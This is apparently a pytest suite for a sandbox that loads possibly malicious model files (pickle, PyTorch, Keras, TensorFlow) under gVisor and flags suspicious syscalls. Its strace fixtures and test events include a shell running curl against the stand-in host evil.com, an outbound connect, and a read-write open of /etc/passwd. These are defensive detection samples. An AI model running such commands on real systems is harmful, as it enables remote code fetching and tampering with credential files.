from __future__ import annotations

import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from hfaudit.sandbox.config import (
    SandboxConfig,
    SandboxResult,
    SyscallEvent,
)
from hfaudit.sandbox.loader_scripts import (
    keras_loader_script,
    pickle_loader_script,
    pytorch_loader_script,
    tensorflow_loader_script,
)
from hfaudit.sandbox.runner import SandboxRunner


# --- SandboxConfig defaults ---


class TestSandboxConfig:
    def test_defaults(self) -> None:
        cfg = SandboxConfig()
        assert cfg.runtime == "runsc"
        assert cfg.network == "none"
        assert cfg.read_only_root is True
        assert cfg.tmpfs_size_mb == 256
        assert cfg.cpu_limit == 1.0
        assert cfg.memory_limit_mb == 2048
        assert cfg.wall_clock_timeout_s == 120
        assert cfg.dns_sinkhole is True
        assert cfg.image == "python:3.11-slim"
        assert cfg.strace_enabled is True

    def test_custom_values(self) -> None:
        cfg = SandboxConfig(memory_limit_mb=4096, wall_clock_timeout_s=60)
        assert cfg.memory_limit_mb == 4096
        assert cfg.wall_clock_timeout_s == 60

    def test_frozen(self) -> None:
        cfg = SandboxConfig()
        with pytest.raises(AttributeError):
            cfg.runtime = "runc"  # type: ignore[misc]


# --- SandboxResult ---


class TestSandboxResult:
    def test_defaults(self) -> None:
        r = SandboxResult(exit_code=0, stdout="ok", stderr="")
        assert r.exit_code == 0
        assert r.syscalls == []
        assert r.malicious_behaviors == []
        assert r.was_killed is False
        assert r.duration_ms == 0


# --- SyscallEvent ---


class TestSyscallEvent:
    def test_creation(self) -> None:
        ev = SyscallEvent(timestamp_ms=123, syscall="execve", args=["/bin/sh"], pid=1)
        assert ev.syscall == "execve"
        assert ev.args == ["/bin/sh"]


# --- is_available ---


class TestIsAvailable:
    @patch("hfaudit.sandbox.runner.shutil.which")
    def test_returns_false_when_runsc_missing(self, mock_which: MagicMock) -> None:
        mock_which.return_value = None
        runner = SandboxRunner()
        assert runner.is_available() is False

    @patch("hfaudit.sandbox.runner.subprocess.run")
    @patch("hfaudit.sandbox.runner.shutil.which")
    def test_returns_false_when_docker_missing(
        self, mock_which: MagicMock, mock_run: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/runsc" if x == "runsc" else None
        runner = SandboxRunner()
        assert runner.is_available() is False

    @patch("hfaudit.sandbox.runner.subprocess.run")
    @patch("hfaudit.sandbox.runner.shutil.which")
    def test_returns_true_when_both_present(
        self, mock_which: MagicMock, mock_run: MagicMock
    ) -> None:
        mock_which.return_value = "/usr/bin/something"
        mock_run.return_value = MagicMock(stdout="map[runsc:{}]")
        runner = SandboxRunner()
        assert runner.is_available() is True

    @patch("hfaudit.sandbox.runner.subprocess.run")
    @patch("hfaudit.sandbox.runner.shutil.which")
    def test_returns_false_when_runtime_not_in_docker(
        self, mock_which: MagicMock, mock_run: MagicMock
    ) -> None:
        mock_which.return_value = "/usr/bin/something"
        mock_run.return_value = MagicMock(stdout="map[runc:{}]")
        runner = SandboxRunner()
        assert runner.is_available() is False

    @patch("hfaudit.sandbox.runner.subprocess.run")
    @patch("hfaudit.sandbox.runner.shutil.which")
    def test_returns_false_on_timeout(
        self, mock_which: MagicMock, mock_run: MagicMock
    ) -> None:
        mock_which.return_value = "/usr/bin/something"
        mock_run.side_effect = subprocess.TimeoutExpired("docker", 10)
        runner = SandboxRunner()
        assert runner.is_available() is False


# --- _build_docker_cmd ---


class TestBuildDockerCmd:
    def test_command_structure(self, tmp_path: Path) -> None:
        model_file = tmp_path / "model.pt"
        model_file.write_bytes(b"fake")
        loader_file = tmp_path / "loader.py"
        loader_file.write_text("pass")

        runner = SandboxRunner()
        cmd = runner._build_docker_cmd(str(model_file), str(loader_file))

        assert cmd[0] == "docker"
        assert cmd[1] == "run"
        assert "--rm" in cmd
        assert "--runtime=runsc" in cmd
        assert "--network=none" in cmd
        assert "--read-only" in cmd
        assert "--security-opt=no-new-privileges" in cmd
        assert "--cpus=1.0" in cmd
        assert "--memory=2048m" in cmd
        assert "--tmpfs=/workspace:size=256m" in cmd
        assert "strace" in cmd
        assert "python3" in cmd
        assert "/loader.py" in cmd

    def test_volume_mounts(self, tmp_path: Path) -> None:
        model_file = tmp_path / "model.pt"
        model_file.write_bytes(b"fake")
        loader_file = tmp_path / "loader.py"
        loader_file.write_text("pass")

        runner = SandboxRunner()
        cmd = runner._build_docker_cmd(str(model_file), str(loader_file))

        vol_args = [cmd[i + 1] for i, v in enumerate(cmd) if v == "-v"]
        assert len(vol_args) == 2
        assert any(":ro" in v and "/model" in v for v in vol_args)
        assert any(":ro" in v and "/loader.py" in v for v in vol_args)

    def test_strace_disabled(self, tmp_path: Path) -> None:
        model_file = tmp_path / "model.pt"
        model_file.write_bytes(b"fake")
        loader_file = tmp_path / "loader.py"
        loader_file.write_text("pass")

        cfg = SandboxConfig(strace_enabled=False)
        runner = SandboxRunner(config=cfg)
        cmd = runner._build_docker_cmd(str(model_file), str(loader_file))
        assert "strace" not in cmd

    def test_custom_config(self, tmp_path: Path) -> None:
        model_file = tmp_path / "model.pt"
        model_file.write_bytes(b"fake")
        loader_file = tmp_path / "loader.py"
        loader_file.write_text("pass")

        cfg = SandboxConfig(cpu_limit=2.0, memory_limit_mb=4096, tmpfs_size_mb=512)
        runner = SandboxRunner(config=cfg)
        cmd = runner._build_docker_cmd(str(model_file), str(loader_file))
        assert "--cpus=2.0" in cmd
        assert "--memory=4096m" in cmd
        assert "--tmpfs=/workspace:size=512m" in cmd


# --- _parse_strace_output ---

SAMPLE_STRACE = """\
[pid     1] 1234567890.123456 execve("/usr/bin/python3", ["python3", "/loader.py"], 0x7ffd) = 0
[pid     1] 1234567890.234567 open("/model/model.pt", O_RDONLY) = 3
[pid     1] 1234567890.345678 openat(AT_FDCWD, "/model/model.pt", O_RDONLY) = 3
[pid     1] 1234567890.456789 execve("/bin/sh", ["sh", "-c", "curl http://evil.com"], 0x7ffd) = 0
[pid     2] 1234567890.567890 connect(4, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("1.2.3.4")}, 16) = -1 ENETUNREACH
"""

CLEAN_STRACE = """\
[pid     1] 1234567890.123456 execve("/usr/bin/python3", ["python3", "/loader.py"], 0x7ffd) = 0
[pid     1] 1234567890.234567 open("/model/model.pt", O_RDONLY) = 3
[pid     1] 1234567890.345678 openat(AT_FDCWD, "/model/model.pt", O_RDONLY) = 3
"""


class TestParseStraceOutput:
    def test_parses_multiple_lines(self) -> None:
        runner = SandboxRunner()
        events = runner._parse_strace_output(SAMPLE_STRACE)
        assert len(events) == 5

    def test_parses_pid(self) -> None:
        runner = SandboxRunner()
        events = runner._parse_strace_output(SAMPLE_STRACE)
        assert events[0].pid == 1
        assert events[4].pid == 2

    def test_parses_syscall_name(self) -> None:
        runner = SandboxRunner()
        events = runner._parse_strace_output(SAMPLE_STRACE)
        assert events[0].syscall == "execve"
        assert events[1].syscall == "open"
        assert events[4].syscall == "connect"

    def test_parses_return_value(self) -> None:
        runner = SandboxRunner()
        events = runner._parse_strace_output(SAMPLE_STRACE)
        assert events[0].return_value == 0
        assert events[4].return_value == -1

    def test_parses_timestamp_ms(self) -> None:
        runner = SandboxRunner()
        events = runner._parse_strace_output(SAMPLE_STRACE)
        assert events[0].timestamp_ms == 1234567890123

    def test_empty_input(self) -> None:
        runner = SandboxRunner()
        events = runner._parse_strace_output("")
        assert events == []

    def test_garbage_input(self) -> None:
        runner = SandboxRunner()
        events = runner._parse_strace_output("not strace output\nrandom text\n")
        assert events == []


# --- _detect_malicious_behaviors ---


class TestDetectMaliciousBehaviors:
    def test_detects_process_execution(self) -> None:
        events = [SyscallEvent(
            timestamp_ms=0,
            syscall="execve",
            args=['"/bin/sh"', '["sh", "-c", "curl http://evil.com"]', "0x7ffd"],
            return_value=0,
            pid=1,
        )]
        runner = SandboxRunner()
        behaviors = runner._detect_malicious_behaviors(events)
        cats = [b.category for b in behaviors]
        assert "process_execution" in cats

    def test_allows_python_interpreter(self) -> None:
        events = [SyscallEvent(
            timestamp_ms=0,
            syscall="execve",
            args=['"/usr/bin/python3"', '["python3", "/loader.py"]', "0x7ffd"],
            return_value=0,
            pid=1,
        )]
        runner = SandboxRunner()
        behaviors = runner._detect_malicious_behaviors(events)
        assert all(b.category != "process_execution" for b in behaviors)

    def test_detects_network_connect(self) -> None:
        events = [SyscallEvent(
            timestamp_ms=0,
            syscall="connect",
            args=[
                "4",
                '{sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("1.2.3.4")}',
                "16",
            ],
            return_value=-1,
            pid=2,
        )]
        runner = SandboxRunner()
        behaviors = runner._detect_malicious_behaviors(events)
        cats = [b.category for b in behaviors]
        assert "network_connect" in cats

    def test_detects_filesystem_write(self) -> None:
        events = [SyscallEvent(
            timestamp_ms=0,
            syscall="open",
            args=['"/etc/passwd"', "O_RDWR"],
            return_value=3,
            pid=1,
        )]
        runner = SandboxRunner()
        behaviors = runner._detect_malicious_behaviors(events)
        cats = [b.category for b in behaviors]
        assert "filesystem_write" in cats

    def test_allows_workspace_writes(self) -> None:
        events = [SyscallEvent(
            timestamp_ms=0,
            syscall="open",
            args=['"/workspace/tmp.txt"', "O_WRONLY|O_CREAT"],
            return_value=3,
            pid=1,
        )]
        runner = SandboxRunner()
        behaviors = runner._detect_malicious_behaviors(events)
        assert all(b.category != "filesystem_write" for b in behaviors)

    def test_detects_dns_query_via_connect(self) -> None:
        events = [SyscallEvent(
            timestamp_ms=0,
            syscall="connect",
            args=[
                "4",
                '{sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}',
                "16",
            ],
            return_value=-1,
            pid=1,
        )]
        runner = SandboxRunner()
        behaviors = runner._detect_malicious_behaviors(events)
        cats = [b.category for b in behaviors]
        assert "dns_query" in cats
        assert "network_connect" not in cats

    def test_detects_dns_query_via_sendto(self) -> None:
        events = [SyscallEvent(
            timestamp_ms=0,
            syscall="sendto",
            args=[
                "4",
                '"\\x00\\x01..."',
                "32",
                "0",
                '{sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}',
                "16",
            ],
            return_value=32,
            pid=1,
        )]
        runner = SandboxRunner()
        behaviors = runner._detect_malicious_behaviors(events)
        cats = [b.category for b in behaviors]
        assert "dns_query" in cats

    def test_clean_execution_no_behaviors(self) -> None:
        runner = SandboxRunner()
        events = runner._parse_strace_output(CLEAN_STRACE)
        behaviors = runner._detect_malicious_behaviors(events)
        assert behaviors == []

    def test_full_strace_detects_all_categories(self) -> None:
        runner = SandboxRunner()
        events = runner._parse_strace_output(SAMPLE_STRACE)
        behaviors = runner._detect_malicious_behaviors(events)
        cats = {b.category for b in behaviors}
        assert "process_execution" in cats
        assert "network_connect" in cats

    def test_severity_values(self) -> None:
        events = [
            SyscallEvent(
                timestamp_ms=0, syscall="execve",
                args=['"/bin/sh"'], return_value=0, pid=1,
            ),
            SyscallEvent(
                timestamp_ms=0, syscall="connect",
                args=["4", '{sin_port=htons(53)}', "16"],
                return_value=-1, pid=1,
            ),
        ]
        runner = SandboxRunner()
        behaviors = runner._detect_malicious_behaviors(events)
        for b in behaviors:
            assert b.severity in ("critical", "high")


# --- run() with mocks ---


class TestRun:
    @patch("hfaudit.sandbox.runner.subprocess.run")
    def test_file_not_found(self, mock_run: MagicMock) -> None:
        runner = SandboxRunner()
        result = runner.run("/nonexistent/model.pt")
        assert result.exit_code == 1
        assert "not found" in result.stderr
        mock_run.assert_not_called()

    @patch("hfaudit.sandbox.runner.subprocess.run")
    def test_successful_execution(self, mock_run: MagicMock, tmp_path: Path) -> None:
        model = tmp_path / "model.pt"
        model.write_bytes(b"fake")
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="LOAD_SUCCESS\n",
            stderr=CLEAN_STRACE,
        )
        runner = SandboxRunner()
        result = runner.run(str(model))
        assert result.exit_code == 0
        assert result.was_killed is False
        assert result.malicious_behaviors == []
        assert len(result.syscalls) > 0

    @patch("hfaudit.sandbox.runner.subprocess.run")
    def test_timeout_handling(self, mock_run: MagicMock, tmp_path: Path) -> None:
        model = tmp_path / "model.pt"
        model.write_bytes(b"fake")
        mock_run.side_effect = subprocess.TimeoutExpired("docker", 120, output=b"", stderr=b"")
        runner = SandboxRunner()
        result = runner.run(str(model))
        assert result.was_killed is True
        assert result.exit_code == -1

    @patch("hfaudit.sandbox.runner.subprocess.run")
    def test_malicious_strace_detected(self, mock_run: MagicMock, tmp_path: Path) -> None:
        model = tmp_path / "model.pt"
        model.write_bytes(b"fake")
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="LOAD_SUCCESS\n",
            stderr=SAMPLE_STRACE,
        )
        runner = SandboxRunner()
        result = runner.run(str(model))
        assert len(result.malicious_behaviors) > 0
        cats = {b.category for b in result.malicious_behaviors}
        assert "process_execution" in cats
        assert "network_connect" in cats


# --- Loader scripts ---


class TestLoaderScripts:
    def test_pickle_loader(self) -> None:
        script = pickle_loader_script("/model/test.pkl")
        assert "pickle.load" in script
        assert "/model/test.pkl" in script
        assert "LOAD_SUCCESS" in script

    def test_pytorch_loader(self) -> None:
        script = pytorch_loader_script("/model/model.pt")
        assert "torch.load" in script
        assert "/model/model.pt" in script

    def test_tensorflow_loader(self) -> None:
        script = tensorflow_loader_script("/model/saved_model")
        assert "tf.saved_model.load" in script

    def test_keras_loader(self) -> None:
        script = keras_loader_script("/model/model.h5")
        assert "keras.models.load_model" in script

    def test_path_escaping(self) -> None:
        script = pickle_loader_script('/model/file with "quotes".pkl')
        assert '\\"' in script
